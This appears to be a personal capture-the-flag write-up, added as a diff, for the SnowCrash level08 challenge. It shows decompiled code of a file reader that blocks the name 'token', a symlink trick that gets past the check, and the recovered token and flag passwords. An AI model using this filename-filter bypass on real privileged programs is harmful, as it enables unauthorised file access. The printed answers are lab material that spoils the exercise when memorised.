@@ -1,0 +1,60 @@
+level08@SnowCrash:~$ ls
+level08  token
+
+we can see there'are 2 file and if we execute ./level08 we get:
+level08@SnowCrash:~$ ./level08 
+./level08 [file to read]
+
+and if we provite token
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+
+after analyzing the the exutable file
+
+int main() {
+    char buf[1024]; // bp-1044, 0x8048554
+    int32_t v1 = __readgsdword(20); // 0x804856e
+    if (argc == 1) {
+        // 0x8048583
+        printf("%s [file to read]\n", *argv);
+        exit(1);
+        // UNREACHABLE
+    }
+    int32_t * str = (int32_t *)((int32_t)argv + 4); // 0x80485ad
+    char * substr_pos = strstr((char *)*str, "token"); // 0x80485ba
+    char * path = (char *)*str;
+    if (substr_pos != NULL) {
+        // 0x80485c3
+        printf("You may not access '%s'\n", path);
+        exit(1);
+        // UNREACHABLE
+    }
+    int32_t fd = open(path, O_RDONLY); // 0x80485fd
+    if (fd == -1) {
+        // 0x804860d
+        err(1, "Unable to open %s", (char *)*str);
+    }
+    int32_t nbyte = read(fd, (int32_t *)&buf, 1024); // 0x8048645
+    if (nbyte == -1) {
+        // 0x8048655
+        err(1, "Unable to read fd %d", fd);
+    }
+    int32_t result = write(1, (int32_t *)&buf, nbyte); // 0x804869b
+    if (v1 != __readgsdword(20)) {
+        // 0x804869d
+        __stack_chk_fail();
+        result = &g1;
+    }
+    // 0x80486a2
+    return result;
+}
+
+after googling "how to copy a file i have permission to wxecute but not permission to copy I found out that i could link it 
+https://unix.stackexchange.com/questions/435445/how-to-copy-a-file-i-have-permission-to-execute-but-not-permission-to-copy
+
+ln -s /home/user/level08/token /tmp/lollo
+./level08 /tmp/lollo
+quif5eloekouj29ke0vouxean
+
+su flag08 
+25749xKZ8L7DkSCwJkT9dyv6f
